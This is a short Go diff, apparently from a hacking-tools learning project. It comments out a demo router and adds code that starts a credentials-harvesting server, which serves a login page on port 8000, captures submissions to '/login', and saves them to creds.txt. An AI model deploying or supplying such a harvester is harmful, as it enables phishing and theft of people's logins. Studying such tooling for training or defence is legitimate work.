@@ -1,12 +1,6 @@
 package main
 
-import (
-	"net/http"
-
-	ghttp "github.com/dmdhrumilmistry/gohtools/http"
-	"github.com/gorilla/mux"
-	"github.com/urfave/negroni"
-)
+import "github.com/dmdhrumilmistry/gohtools/http"
 
 func main() {
 
@@ -80,13 +74,22 @@ func main() {
 	// http.ListenAndServe("0.0.0.0:8000", &l)
 
 	// Middleware: Negroni and Handler: gorillaMux
-	r := mux.NewRouter()
-	n := negroni.Classic()
-	n.UseHandler(r)
-	n.Use(&ghttp.TrivialMiddleware{})
+	// r := mux.NewRouter()
+	// n := negroni.Classic()
+	// n.UseHandler(r)
+	// n.Use(&ghttp.TrivialMiddleware{})
 
-	r.HandleFunc("/hello", ghttp.EchoParam).Methods("GET")
-	r.HandleFunc("/users/{user:[a-z]+}", ghttp.EchoUserParam).Methods("GET")
+	// r.HandleFunc("/hello", ghttp.EchoParam).Methods("GET")
+	// r.HandleFunc("/users/{user:[a-z]+}", ghttp.EchoUserParam).Methods("GET")
 
-	http.ListenAndServe("0.0.0.0:8000", n)
+	// http.ListenAndServe("0.0.0.0:8000", n)
+
+	// Start Creds harvesting server
+	filePath := "creds.txt"
+	port := 8000
+	captureUri := "/login"
+	serverRootPath := "public"
+	credsHarvestingServ := http.NewLoginHarvest(filePath, port, captureUri, serverRootPath)
+	credsHarvestingServ.StartHarvesting()
+
 }
